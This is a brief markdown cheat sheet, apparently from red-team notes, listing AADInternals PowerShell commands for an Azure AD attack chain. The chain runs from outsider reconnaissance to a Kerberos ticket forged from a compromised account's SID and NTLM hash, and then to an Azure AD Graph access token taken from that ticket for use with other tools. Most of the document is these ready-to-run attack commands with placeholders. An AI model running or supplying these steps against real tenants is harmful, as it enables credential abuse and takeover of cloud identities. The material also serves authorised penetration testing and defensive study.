# AADInternals

## Github repo: https://github.com/Gerenios/AADInternals

## Official Documentation: https://aadinternals.com/aadkillchain/

### Commands:

#### 1) Reconnaissance. Can be both from inside or outside the network

    Invoke-AADIntReconAsOutsider -Domain domain.local | Format-Table 

#### 2) Grab a Kerberos Ticket for the account mentioned on the INTERNAL_AD_SID, then use the NTLM hash of the compromised account

    $kerberos=NewAADIntKerberosTicket -SidString INTERNAL_AD_SID -Hash NTLM_HASH 

#### 3) Initiate an access token for Azure AD Graph from the Kerberos Ticket. This is necessary so we can pass the token to use with ROADTools or any other tool we may need to use

    Get-AADIntAccessTokenForAADGraph -KerberosTicket $kerberos -Domain DOMAIN.LOCAL 

#### 4) Get login information about the target domain

    Get-AADIntLoginInformation -Domain DOMAIN.COM 

#### 5) Get tenant ID of the domain

    Get-AADIntTenantID -Domain DOMAIN.COM 




